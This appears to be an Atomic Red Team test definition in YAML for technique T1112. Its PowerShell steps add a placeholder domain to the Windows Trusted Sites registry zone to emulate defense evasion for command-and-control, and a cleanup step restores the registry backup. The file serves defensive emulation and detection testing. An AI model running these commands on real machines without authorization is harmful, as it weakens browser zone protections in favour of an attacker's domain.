# Converted from Atomic Red Team - Modify Registry
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
# Original auto_generated_guid: cf447677-5a4e-4937-a82c-e47d254afd57

---
api_version: 2.0
uuid: 4cd57849-c6c2-441c-b173-d726bc885ce9
name: Add domain to Trusted sites Zone
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
  Upon execution, details of the new registry entries will be displayed.
  Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.

  https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf

mitre:
  tactics:
    - "TA0005 Defense Evasion"
  techniques:
    - "T1112 Modify Registry"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: bad_domain
    description: Domain to add to trusted site zone
    type: string
    default: "bad-domain.com"
  - name: backup_location
    description: Path where registry backup will be saved
    type: path
    default: "C:\\Users\\Public\\backup.reg"

steps:
  - name: backup_registry
    executor: powershell
    inline: |
      reg export "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap" "{{.Args.backup_location}}" /y

  - name: add_trusted_site
    executor: powershell
    inline: |
      $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\{{.Args.bad_domain}}\"
      $name ="bad-subdomain"
      new-item $key -Name $name -Force
      new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
      new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
      new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
    cleanup:
      executor: powershell
      inline: |
        reg import "{{.Args.backup_location}}"
        Remove-Item "{{.Args.backup_location}}" -Force -ErrorAction Ignore
